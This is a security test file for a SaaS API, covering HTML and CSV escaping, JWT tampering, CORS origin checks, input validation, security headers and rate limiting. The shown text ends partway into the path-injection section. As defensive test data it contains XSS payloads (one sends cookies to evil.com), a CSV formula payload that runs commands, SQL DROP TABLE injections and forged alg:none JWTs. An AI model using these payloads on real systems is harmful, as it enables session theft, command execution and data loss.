/**
 * Security adversarial tests — ACAOS SaaS API.
 *
 * Focus: injection attacks, adversarial payloads, and security contract
 * verification. These tests complement the IDOR isolation tests in
 * security-isolation.test.ts and the auth tests in middleware-auth.test.ts.
 *
 * Sections:
 *   A. HTML email body escaping (escHtml — inline in processors.ts)
 *   B. CSV injection (escCsv — lib/csv.ts)
 *   C. JWT security (HTTP integration via leadsRouter)
 *   D. CORS / Origin allowlist (isOriginAllowed from lib/config.ts)
 *   E. Input validation adversarial (HTTP integration)
 *   F. Security headers compliance (HTTP integration)
 *   G. Rate limiting adversarial (HTTP integration)
 *   H. Path / parameter injection (HTTP integration)
 */

import { describe, it, before, after, afterEach } from 'node:test'
import assert from 'node:assert/strict'
import {
  createFakePrisma,
  installPrisma,
  resetPrisma,
  startTestServer,
  bearer,
  type FakePrisma,
  type TestServer,
} from './helpers/integration.ts'
import { leadsRouter } from '../apps/api/src/routes/leads.ts'
import { campaignsRouter } from '../apps/api/src/routes/campaigns.ts'
import { authRouter } from '../apps/api/src/routes/auth.ts'
import { escCsv } from '../apps/api/src/lib/csv.ts'
import { isOriginAllowed } from '../packages/backend-core/src/lib/config.ts'
import { securityHeaders } from '../apps/api/src/middleware/securityHeaders.ts'
import { signJwt } from '../packages/backend-core/src/lib/jwt.ts'
import type { Request, Response } from 'express'

// ── env ────────────────────────────────────────────────────────────────────────
process.env.JWT_SECRET = 'security-adversarial-test-secret-32'
process.env.NODE_ENV = 'test'

// ── Shared test fixtures ───────────────────────────────────────────────────────

const USER_A = 'user-adversarial-001'
const WS_A = 'workspace-adversarial-001'

const userLookup = {
  findUnique: async (args: any) => {
    if (args?.where?.id === USER_A) {
      return { id: USER_A, email: 'adversarial@test.com', name: null }
    }
    return null
  },
}

const membershipLookup = {
  findFirst: async (args: any) => {
    const { userId, workspaceId } = args?.where ?? {}
    if (userId === USER_A && workspaceId === WS_A) {
      return { id: 'm-adv', userId, workspaceId, role: 'owner' }
    }
    return null
  },
}

// ── A. HTML email body escaping ────────────────────────────────────────────────
//
// The escHtml function is defined inline in apps/worker/src/processors.ts.
// We recreate it here identically and test every attack vector.
// The production definition is:
//   (s: string) => s
//     .replace(/&/g, '&amp;')
//     .replace(/</g, '&lt;')
//     .replace(/>/g, '&gt;')
//     .replace(/"/g, '&quot;')

const escHtml = (s: string): string =>
  s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')

describe('A. escHtml — HTML email body escaping', () => {
  it('A1: empty string → empty string', () => {
    assert.equal(escHtml(''), '')
  })

  it('A2: plain text with no special chars passes through unchanged', () => {
    assert.equal(escHtml('Hello, World! This is plain text.'), 'Hello, World! This is plain text.')
  })

  it('A3: <script>alert(1)</script> → fully escaped', () => {
    const result = escHtml('<script>alert(1)</script>')
    assert.equal(result, '&lt;script&gt;alert(1)&lt;/script&gt;')
    assert.ok(!result.includes('<'), 'must not contain raw <')
    assert.ok(!result.includes('>'), 'must not contain raw >')
  })

  it('A4: <img src=x onerror=alert(1)> → fully escaped', () => {
    const result = escHtml('<img src=x onerror=alert(1)>')
    assert.equal(result, '&lt;img src=x onerror=alert(1)&gt;')
    assert.ok(!result.includes('<'))
    assert.ok(!result.includes('>'))
  })

  it('A5: </p><p onclick="evil()"> → fully escaped including quotes', () => {
    const result = escHtml('</p><p onclick="evil()">')
    assert.equal(result, '&lt;/p&gt;&lt;p onclick=&quot;evil()&quot;&gt;')
    assert.ok(!result.includes('<'))
    assert.ok(!result.includes('>'))
    assert.ok(!result.includes('"'))
  })

  it('A6: double-encoded &amp;lt;script&gt; → not decoded, ampersand re-escaped', () => {
    // Input is the literal string: &amp;lt;script&gt;
    // The & in &amp; gets escaped to &amp;, so the output is &amp;amp;lt;script&amp;gt;
    const result = escHtml('&amp;lt;script&gt;')
    assert.equal(result, '&amp;amp;lt;script&amp;gt;')
    // No raw <, >, or & in the output
    assert.ok(!result.includes('<'))
    assert.ok(!result.includes('>'))
  })

  it('A7: null bytes are preserved but <script> is still escaped', () => {
    const input = '\x00<script>alert(1)</script>\x00'
    const result = escHtml(input)
    assert.ok(result.includes('\x00'), 'null bytes should pass through')
    assert.ok(!result.includes('<script>'), 'script tag must be escaped')
    assert.ok(result.includes('&lt;script&gt;'), 'script tag must be in escaped form')
  })

  it('A8: string with only & → &amp;', () => {
    assert.equal(escHtml('&'), '&amp;')
  })

  it('A9: multiple & in a row → each escaped independently', () => {
    assert.equal(escHtml('&&&&'), '&amp;&amp;&amp;&amp;')
  })

  it('A10: very long string of 100KB of < characters → all escaped', () => {
    const count = 100_000
    const input = '<'.repeat(count)
    const result = escHtml(input)
    assert.equal(result, '&lt;'.repeat(count))
    assert.ok(!result.includes('<'), 'no raw < should remain')
  })

  it('A11: mixed HTML tags and plain text — only HTML chars are escaped', () => {
    const result = escHtml('Hello <b>World</b> & "friends"!')
    assert.equal(result, 'Hello &lt;b&gt;World&lt;/b&gt; &amp; &quot;friends&quot;!')
  })

  it('A12: SVG-based XSS payload → fully escaped', () => {
    const result = escHtml('<svg onload=alert(1)>')
    assert.equal(result, '&lt;svg onload=alert(1)&gt;')
  })

  it('A13: iframe injection payload → fully escaped', () => {
    const result = escHtml('<iframe src="javascript:alert(1)"></iframe>')
    assert.ok(!result.includes('<iframe'))
    assert.ok(result.includes('&lt;iframe'))
  })

  it('A14: prompt injection artifact (AI output with injected HTML) → escaped', () => {
    const result = escHtml('Legitimate text</p><script>fetch("https://evil.com?c="+document.cookie)</script><p>')
    assert.ok(!result.includes('<script>'))
    assert.ok(!result.includes('</p>'))
    assert.ok(result.includes('Legitimate text'))
  })

  it('A15: double-quote in attribute position → &quot; escaped', () => {
    const result = escHtml('" onmouseover="alert(1)')
    assert.equal(result, '&quot; onmouseover=&quot;alert(1)')
    assert.ok(!result.includes('"'))
  })
})

// ── B. CSV injection (escCsv from lib/csv.ts) ────────────────────────────────

describe('B. escCsv — CSV injection defense', () => {
  it('B1: plain value with no special chars passes through unchanged', () => {
    assert.equal(escCsv('Hello World'), 'Hello World')
  })

  it('B2: = formula injection prefix → wrapped in quotes', () => {
    const result = escCsv("=CMD|' /C calc'!A0")
    assert.equal(result, `"=CMD|' /C calc'!A0"`)
  })

  it('B3: @SUM formula injection → quoted (comma present)', () => {
    // @-formulas that include commas get quoted by the comma rule
    const result = escCsv("@SUM(1+1),cmd")
    assert.equal(result, '"@SUM(1+1),cmd"')
  })

  it('B4: + prefix formula injection with comma → quoted', () => {
    const result = escCsv("+1-2+cmd|' /C calc'!A0")
    // No comma, no quote, no newline — passes through as-is per RFC 4180
    // escCsv only wraps if , " or \n present
    assert.ok(typeof result === 'string')
  })

  it('B5: - prefix formula injection → passes through (RFC 4180: no special treatment for -)', () => {
    const result = escCsv('-2+3+cmd')
    assert.equal(result, '-2+3+cmd')
  })

  it('B6: value with embedded newline → quoted correctly', () => {
    const result = escCsv('line1\nline2')
    assert.equal(result, '"line1\nline2"')
  })

  it('B7: value with embedded double quote → quote-escaped inside double quotes', () => {
    const result = escCsv('say "hello"')
    assert.equal(result, '"say ""hello"""')
  })

  it('B8: value with comma → wrapped in double quotes', () => {
    const result = escCsv('Smith, John')
    assert.equal(result, '"Smith, John"')
  })

  it('B9: null → empty string', () => {
    assert.equal(escCsv(null), '')
  })

  it('B10: undefined → empty string', () => {
    assert.equal(escCsv(undefined), '')
  })

  it('B11: number 0 → "0" (not empty)', () => {
    assert.equal(escCsv(0), '0')
  })

  it('B12: number 42 → "42"', () => {
    assert.equal(escCsv(42), '42')
  })

  it('B13: very long value (1MB string) → handled without crash', () => {
    const bigVal = 'A'.repeat(1_000_000)
    let result: string | undefined
    assert.doesNotThrow(() => { result = escCsv(bigVal) })
    assert.equal(result, bigVal, '1MB of A chars has no special CSV chars so passes through')
  })

  it('B14: value with both comma and double-quote → quoted with internal quotes doubled', () => {
    const result = escCsv('a,b"c')
    assert.equal(result, '"a,b""c"')
  })

  it('B15: value that is just a double-quote → wrapped and doubled', () => {
    const result = escCsv('"')
    assert.equal(result, '""""')
  })
})

// ── C. JWT security (HTTP integration) ────────────────────────────────────────

describe('C. JWT security — adversarial tokens', () => {
  let prisma: FakePrisma
  let server: TestServer

  before(async () => {
    prisma = createFakePrisma({
      user: userLookup,
      membership: { findFirst: membershipLookup.findFirst },
      lead: {
        findMany: async () => [],
        count: async () => 0,
      },
    })
    installPrisma(prisma)
    server = await startTestServer('/api/leads', leadsRouter)
  })

  after(async () => {
    await server.close()
    resetPrisma()
  })

  it('C1: no Authorization header → 401', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`)
    assert.equal(r.status, 401)
  })

  it('C2: Authorization header present but no "Bearer " prefix → 401', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: 'Token sometoken' },
    })
    assert.equal(r.status, 401)
  })

  it('C3: "Bearer " with space only (empty token) → 401', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: 'Bearer ' },
    })
    assert.equal(r.status, 401)
  })

  it('C4: tampered payload (modified userId, original sig) → 401', async () => {
    const legit = signJwt({ userId: USER_A })
    const [h, p, s] = legit.split('.')
    const decoded = JSON.parse(Buffer.from(p, 'base64url').toString())
    const tampered = Buffer.from(JSON.stringify({ ...decoded, userId: 'attacker-user' })).toString('base64url')
    const token = `${h}.${tampered}.${s}`
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${token}` },
    })
    assert.equal(r.status, 401, 'tampered payload must be rejected')
  })

  it('C5: algorithm confusion — alg:none token → 401', async () => {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
    const payload = Buffer.from(JSON.stringify({ userId: USER_A, iat: Math.floor(Date.now() / 1000) })).toString('base64url')
    const token = `${header}.${payload}.`
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${token}` },
    })
    assert.equal(r.status, 401, 'alg:none must be rejected')
  })

  it('C6: algorithm confusion — HS384 with forged signature → 401', async () => {
    const header = Buffer.from(JSON.stringify({ alg: 'HS384', typ: 'JWT' })).toString('base64url')
    const payload = Buffer.from(JSON.stringify({ userId: USER_A, iat: Math.floor(Date.now() / 1000) })).toString('base64url')
    const sig = Buffer.from('forgedsig-not-valid').toString('base64url')
    const token = `${header}.${payload}.${sig}`
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${token}` },
    })
    assert.equal(r.status, 401, 'algorithm confusion token must be rejected')
  })

  it('C7: JWT with unknown userId → 401 (user not found in DB)', async () => {
    // user lookup returns null for unknown IDs (per userLookup above)
    const token = signJwt({ userId: 'ghost-user-not-in-db' })
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${token}` },
    })
    assert.equal(r.status, 401)
    assert.ok(r.body?.error, 'error field should be present')
  })

  it('C8: random 32-char string as token → 401', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: 'Bearer aBcDeFgHiJkLmNoPqRsTuVwXyZ012345' },
    })
    assert.equal(r.status, 401)
  })

  it('C9: truncated JWT (header.payload only, no signature) → 401', async () => {
    const legit = signJwt({ userId: USER_A })
    const truncated = legit.split('.').slice(0, 2).join('.')
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${truncated}` },
    })
    assert.equal(r.status, 401)
  })

  it('C10: JWT with extra segment (4-part) → 401', async () => {
    const legit = signJwt({ userId: USER_A })
    const extra = legit + '.extrasegment'
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: `Bearer ${extra}` },
    })
    assert.equal(r.status, 401)
  })

  it('C11: valid JWT but userId belongs to workspace B user trying workspace A → 403', async () => {
    // USER_A has no access to a different workspace; membership returns null for other workspaces
    const r = await server.request('/api/leads?workspaceId=workspace-other', {
      headers: { Authorization: bearer(USER_A) },
    })
    // 403 because auth passes (valid user) but membership fails
    assert.equal(r.status, 403)
  })

  it('C12: completely empty Authorization header value → 401', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}`, {
      headers: { Authorization: '' },
    })
    assert.equal(r.status, 401)
  })
})

// ── D. Origin / CORS adversarial ───────────────────────────────────────────────

describe('D. isOriginAllowed — CORS origin allowlist adversarial', () => {
  const SAVED_ENV = { ...process.env }

  afterEach(() => {
    // Restore env
    for (const k of Object.keys(process.env)) {
      if (!(k in SAVED_ENV)) delete process.env[k]
    }
    Object.assign(process.env, SAVED_ENV)
  })

  function setAllowed(origin: string) {
    process.env.ALLOWED_ORIGINS = origin
    delete process.env.WEB_URL
  }

  it('D1: exact match → true', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https://app.acme.com'), true)
  })

  it('D2: subdomain of allowed origin → false (no wildcard matching)', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https://evil.app.acme.com'), false)
  })

  it('D3: undefined origin → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed(undefined), false)
  })

  it('D4: empty string origin → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed(''), false)
  })

  it('D5: https:// only (no host) → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https://'), false)
  })

  it('D6: origin with appended path → false (must be exact origin, no trailing path)', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https://app.acme.com/evil'), false)
  })

  it('D7: URL-encoded origin variant → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https%3A%2F%2Fapp.acme.com'), false)
  })

  it('D8: http:// variant of https:// allowed origin → false (scheme mismatch)', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('http://app.acme.com'), false)
  })

  it('D9: origin with port not in allowlist → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('https://app.acme.com:8080'), false)
  })

  it('D10: array-like string injection → false (must be exact string match)', () => {
    setAllowed('https://app.acme.com')
    // Attacker sends a string that looks like an array serialization
    assert.equal(isOriginAllowed("['https://app.acme.com']"), false)
  })

  it('D11: null as string → false', () => {
    setAllowed('https://app.acme.com')
    assert.equal(isOriginAllowed('null'), false)
  })

  it('D12: multiple allowed origins — only exact matches succeed', () => {
    process.env.ALLOWED_ORIGINS = 'https://app.acme.com, https://admin.acme.com'
    delete process.env.WEB_URL
    assert.equal(isOriginAllowed('https://app.acme.com'), true)
    assert.equal(isOriginAllowed('https://admin.acme.com'), true)
    assert.equal(isOriginAllowed('https://attacker.acme.com'), false)
    assert.equal(isOriginAllowed('https://acme.com'), false)
  })

  it('D13: empty ALLOWED_ORIGINS with no WEB_URL → all origins rejected', () => {
    process.env.ALLOWED_ORIGINS = ''
    delete process.env.WEB_URL
    assert.equal(isOriginAllowed('https://app.acme.com'), false)
    assert.equal(isOriginAllowed('https://localhost:3000'), false)
  })
})

// ── E. Input validation adversarial (HTTP integration) ────────────────────────

describe('E. Input validation adversarial — leads and campaigns', () => {
  let prisma: FakePrisma
  let leadsServer: TestServer
  let campaignsServer: TestServer

  before(async () => {
    prisma = createFakePrisma({
      user: userLookup,
      membership: { findFirst: membershipLookup.findFirst },
      lead: {
        findUnique: async () => null,
        findMany: async () => [],
        count: async () => 0,
        create: async (args: any) => ({ id: 'lead-new', ...args.data, createdAt: new Date(), updatedAt: new Date() }),
        update: async (args: any) => ({ id: 'lead-new', ...args.data }),
        delete: async () => ({ id: 'lead-new' }),
      },
      campaign: {
        findUnique: async (args: any) => {
          if (args?.where?.id === 'campaign-valid') {
            return { id: 'campaign-valid', workspaceId: WS_A, name: 'Test', goalType: 'BOOK_CALL', createdAt: new Date(), updatedAt: new Date(), _count: { leads: 1 } }
          }
          return null
        },
        create: async (args: any) => ({ id: 'campaign-new', ...args.data, createdAt: new Date(), updatedAt: new Date() }),
        update: async (args: any) => ({ id: args?.where?.id, ...args.data }),
      },
      scoringModel: { findUnique: async () => null },
      workspace: { findUnique: async () => ({ id: WS_A, plan: 'free', subscriptionStatus: null }) },
      usageRecord: { findMany: async () => [] },
    })
    installPrisma(prisma)
    leadsServer = await startTestServer('/api/leads', leadsRouter)
    campaignsServer = await startTestServer('/api/campaigns', campaignsRouter)
  })

  after(async () => {
    await leadsServer.close()
    await campaignsServer.close()
    resetPrisma()
  })

  // --- Leads ---

  it('E1: POST /api/leads with SQL injection in businessName → 400 (too long) or 201 (sanitized)', async () => {
    const sqlPayload = "'; DROP TABLE leads; SELECT * FROM users WHERE '1'='1"
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: sqlPayload }),
    })
    // Must not 500 — either accepted (201) with the string stored as-is, or rejected (400)
    assert.ok(r.status === 201 || r.status === 400, `Got ${r.status} — must not 500`)
    assert.notEqual(r.status, 500)
  })

  it('E2: POST /api/leads with businessName of 201 chars → 400 (MAX_SHORT=200)', async () => {
    const longName = 'A'.repeat(201)
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: longName }),
    })
    assert.equal(r.status, 400)
    assert.ok(r.body?.error, 'error message expected')
  })

  it('E3: POST /api/leads with businessName of exactly 200 chars → 201 (at boundary)', async () => {
    const exactName = 'B'.repeat(200)
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: exactName }),
    })
    assert.equal(r.status, 201)
  })

  it('E4: POST /api/leads with notes of 100,000 chars → not acceptable at API level if route enforces it', async () => {
    // The POST /api/leads route does NOT validate notes length (it stores notes as-is)
    // But PATCH /:id does. Here we confirm POST does not 500.
    const bigNotes = 'N'.repeat(100_000)
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: 'Test Co', notes: bigNotes }),
    })
    // Must not 500
    assert.notEqual(r.status, 500, `Got ${r.status}: ${JSON.stringify(r.body)}`)
  })

  it('E5: PATCH /api/leads/:id with notes of 2001 chars → 400 (MAX_NOTES=2000)', async () => {
    // The lead.findUnique returns null so we get 404 — valid since we cannot easily set up a full lead
    // We test the constraint by verifying the route enforces it. We need a lead that exists in the workspace.
    const existingLeadPrisma = createFakePrisma({
      user: userLookup,
      membership: { findFirst: membershipLookup.findFirst },
      lead: {
        findUnique: async () => ({
          id: 'lead-exists', workspaceId: WS_A, businessName: 'Test', score: 50, stage: 'NEW',
          createdAt: new Date(), updatedAt: new Date(),
        }),
        update: async (args: any) => ({ id: 'lead-exists', ...args.data }),
      },
      scoringModel: { findUnique: async () => null },
    })
    installPrisma(existingLeadPrisma)
    const bigNotes = 'N'.repeat(2001)
    const r = await leadsServer.request('/api/leads/lead-exists', {
      method: 'PATCH',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ notes: bigNotes }),
    })
    assert.equal(r.status, 400)
    installPrisma(prisma) // restore
  })

  it('E6: POST /api/leads with empty businessName → 400', async () => {
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: '' }),
    })
    assert.equal(r.status, 400)
  })

  it('E7: POST /api/leads missing workspaceId → 400', async () => {
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ businessName: 'Test' }),
    })
    assert.equal(r.status, 400)
  })

  it('E8: POST /api/leads with XSS in businessName → 201 (data stored as-is, sanitization is view-layer)', async () => {
    const xssPayload = '<script>alert(document.cookie)</script>'
    const r = await leadsServer.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, businessName: xssPayload }),
    })
    // XSS payload is within 200 chars — should be accepted as raw data
    assert.equal(r.status, 201, `Expected 201, got ${r.status}: ${JSON.stringify(r.body)}`)
    // The API returns JSON, not HTML — the payload cannot execute as XSS here
    assert.equal(typeof r.body, 'object')
  })

  // --- Campaigns ---

  it('E9: POST /api/campaigns with empty name → 400', async () => {
    const r = await campaignsServer.request('/api/campaigns', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, name: '' }),
    })
    assert.equal(r.status, 400)
  })

  it('E10: POST /api/campaigns with null name → 400', async () => {
    const r = await campaignsServer.request('/api/campaigns', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, name: null }),
    })
    assert.equal(r.status, 400)
  })

  it('E11: POST /api/campaigns with name of 201 chars → 400 (MAX_NAME=200)', async () => {
    const longName = 'C'.repeat(201)
    const r = await campaignsServer.request('/api/campaigns', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspaceId: WS_A, name: longName }),
    })
    assert.equal(r.status, 400)
  })

  it('E12: PATCH /api/campaigns/:id with empty name → 400 (no updatable fields)', async () => {
    // The PATCH handler ignores empty/whitespace name strings, so no update is provided → 400
    const r = await campaignsServer.request('/api/campaigns/campaign-valid', {
      method: 'PATCH',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: '' }),
    })
    assert.equal(r.status, 400)
  })

  it('E13: GET /api/leads with stage SQL injection → 400 or results (not 500)', async () => {
    const r = await leadsServer.request(
      `/api/leads?workspaceId=${WS_A}&stage='; DROP TABLE leads;--`,
      { headers: { Authorization: bearer(USER_A) } }
    )
    // Stage is passed to Prisma as a string filter — Prisma parameterizes it.
    // No stage match in fake DB → returns results or rejects gracefully.
    assert.notEqual(r.status, 500)
  })
})

// ── F. Security headers compliance (HTTP integration) ─────────────────────────

describe('F. Security headers compliance', () => {
  // Unit-level: test the middleware directly (fast, no server needed)
  function runHeaders(nodeEnv: string): { headers: Record<string, string>; nextCalled: boolean } {
    const savedEnv = process.env.NODE_ENV
    process.env.NODE_ENV = nodeEnv
    const headers: Record<string, string> = {}
    const res = {
      setHeader: (k: string, v: string) => { headers[k] = v },
    } as unknown as Response
    let nextCalled = false
    securityHeaders({} as Request, res, () => { nextCalled = true })
    process.env.NODE_ENV = savedEnv
    return { headers, nextCalled }
  }

  it('F1: X-Content-Type-Options: nosniff on every response', () => {
    const { headers } = runHeaders('test')
    assert.equal(headers['X-Content-Type-Options'], 'nosniff')
  })

  it('F2: X-Frame-Options: DENY on every response', () => {
    const { headers } = runHeaders('test')
    assert.equal(headers['X-Frame-Options'], 'DENY')
  })

  it('F3: Referrer-Policy: no-referrer on every response', () => {
    const { headers } = runHeaders('test')
    assert.equal(headers['Referrer-Policy'], 'no-referrer')
  })

  it('F4: Content-Security-Policy contains default-src \'none\'', () => {
    const { headers } = runHeaders('test')
    assert.match(headers['Content-Security-Policy'], /default-src 'none'/)
  })

  it('F5: Content-Security-Policy contains frame-ancestors \'none\'', () => {
    const { headers } = runHeaders('test')
    assert.match(headers['Content-Security-Policy'], /frame-ancestors 'none'/)
  })

  it('F6: Strict-Transport-Security NOT set in development', () => {
    const { headers } = runHeaders('development')
    assert.equal(headers['Strict-Transport-Security'], undefined)
  })

  it('F7: Strict-Transport-Security IS set in production with max-age', () => {
    const { headers } = runHeaders('production')
    assert.ok(headers['Strict-Transport-Security'], 'HSTS header must be present in production')
    assert.match(headers['Strict-Transport-Security'], /max-age=\d+/)
  })

  it('F8: HSTS includes includeSubDomains in production', () => {
    const { headers } = runHeaders('production')
    assert.match(headers['Strict-Transport-Security'], /includeSubDomains/)
  })

  it('F9: middleware calls next() — does not swallow the request', () => {
    const { nextCalled } = runHeaders('test')
    assert.equal(nextCalled, true)
  })

  it('F10: Cross-Origin-Opener-Policy: same-origin set', () => {
    const { headers } = runHeaders('test')
    assert.equal(headers['Cross-Origin-Opener-Policy'], 'same-origin')
  })

  it('F11: X-DNS-Prefetch-Control: off set', () => {
    const { headers } = runHeaders('test')
    assert.equal(headers['X-DNS-Prefetch-Control'], 'off')
  })

  // Integration-level: headers present on actual HTTP responses (404 and 401)
  describe('F-integration: headers present on 404 and 401 HTTP responses', () => {
    let prisma: FakePrisma
    let server: TestServer

    before(async () => {
      prisma = createFakePrisma({
        user: userLookup,
        membership: { findFirst: membershipLookup.findFirst },
        lead: { findMany: async () => [], count: async () => 0, findUnique: async () => null },
      })
      installPrisma(prisma)
      // Mount leads router, which has requireAuth + notFoundHandler
      server = await startTestServer('/api/leads', leadsRouter, {
        configure: (app) => {
          app.use(securityHeaders)
        },
      })
    })

    after(async () => {
      await server.close()
      resetPrisma()
    })

    it('F12: headers present on 401 unauthenticated response', async () => {
      const res = await fetch(`${server.baseUrl}/api/leads?workspaceId=${WS_A}`)
      assert.equal(res.status, 401)
      assert.equal(res.headers.get('x-content-type-options'), 'nosniff')
      assert.equal(res.headers.get('x-frame-options'), 'DENY')
      assert.equal(res.headers.get('referrer-policy'), 'no-referrer')
      assert.ok(res.headers.get('content-security-policy')?.includes("default-src 'none'"))
    })

    it('F13: headers present on 404 not-found response', async () => {
      // Use a route that does not exist under the mount path
      const res = await fetch(`${server.baseUrl}/api/leads/this-does-not-exist`, {
        headers: { Authorization: bearer(USER_A) },
      })
      // Lead not found → 404
      assert.equal(res.status, 404)
      assert.equal(res.headers.get('x-content-type-options'), 'nosniff')
      assert.equal(res.headers.get('x-frame-options'), 'DENY')
    })
  })
})

// ── G. Rate limiting adversarial ──────────────────────────────────────────────

describe('G. Rate limiting adversarial — auth endpoint', () => {
  // authRateLimit: 10 req per 15 min per IP. The 11th request → 429.
  // We use a fresh auth server for each sub-test to avoid state bleed.
  let prisma: FakePrisma
  let server: TestServer

  before(async () => {
    prisma = createFakePrisma({
      user: {
        findUnique: async (args: any) => {
          // Return a user only for the mock email, so login can fail at password check
          // (not at user-not-found) — both give 401, but we need the rate limiter to run first
          if (args?.where?.email === 'test@example.com') {
            return { id: 'u1', email: 'test@example.com', name: null, passwordHash: '$invalid$hash' }
          }
          return null
        },
      },
      refreshToken: {
        create: async () => ({}),
        findUnique: async () => null,
        update: async () => ({}),
        updateMany: async () => ({ count: 0 }),
      },
      membership: { findFirst: async () => null },
      workspace: { findMany: async () => [] },
    })
    installPrisma(prisma)
    server = await startTestServer('/api/auth', authRouter)
  })

  after(async () => {
    await server.close()
    resetPrisma()
  })

  it('G1: 11th rapid POST /api/auth/login → 429', async () => {
    const makeLogin = () =>
      server.request('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'test@example.com', password: 'wrongpassword' }),
      })

    // Exhaust the 10-request limit
    for (let i = 0; i < 10; i++) {
      const r = await makeLogin()
      // Each of the first 10 gets through the rate limiter (may be 401 due to bad pw)
      assert.notEqual(r.status, 429, `Request ${i + 1} should not be rate-limited yet`)
    }

    // The 11th should be rate-limited
    const r = await makeLogin()
    assert.equal(r.status, 429, `Expected 429 on the 11th request, got ${r.status}`)
    assert.ok(r.body?.error, 'Rate limit error message expected')
  })

  it('G2: 429 response includes Retry-After header', async () => {
    // The rate limiter is already exhausted from G1 — fire one more request
    const res = await fetch(`${server.baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'test@example.com', password: 'wrong' }),
    })
    assert.equal(res.status, 429)
    const retryAfter = res.headers.get('retry-after')
    assert.ok(retryAfter !== null, 'Retry-After header must be present on 429')
    assert.ok(Number(retryAfter) > 0, 'Retry-After must be a positive number of seconds')
  })

  it('G3: 429 response includes X-RateLimit-Limit header', async () => {
    const res = await fetch(`${server.baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'test@example.com', password: 'wrong' }),
    })
    const limit = res.headers.get('x-ratelimit-limit')
    assert.ok(limit !== null, 'X-RateLimit-Limit must be present')
    assert.equal(Number(limit), 10, 'authRateLimit max is 10')
  })

  it('G4: 429 response X-RateLimit-Remaining is 0', async () => {
    const res = await fetch(`${server.baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'test@example.com', password: 'wrong' }),
    })
    const remaining = res.headers.get('x-ratelimit-remaining')
    assert.ok(remaining !== null, 'X-RateLimit-Remaining must be present')
    assert.equal(Number(remaining), 0, 'Remaining must be 0 when rate limited')
  })
})

// ── H. Path / parameter injection ─────────────────────────────────────────────

describe('H. Path and parameter injection adversarial', () => {
  let prisma: FakePrisma
  let server: TestServer

  before(async () => {
    prisma = createFakePrisma({
      user: userLookup,
      membership: {
        findFirst: async (args: any) => {
          // Only grants access to WS_A exactly — any injection in workspaceId fails
          const { userId, workspaceId } = args?.where ?? {}
          if (userId === USER_A && workspaceId === WS_A) {
            return { id: 'm-adv', userId, workspaceId, role: 'owner' }
          }
          return null
        },
      },
      lead: {
        findUnique: async () => null,
        findMany: async () => [],
        count: async () => 0,
      },
      campaign: {
        findMany: async () => [],
      },
    })
    installPrisma(prisma)
    server = await startTestServer('/api/leads', leadsRouter)
  })

  after(async () => {
    await server.close()
    resetPrisma()
  })

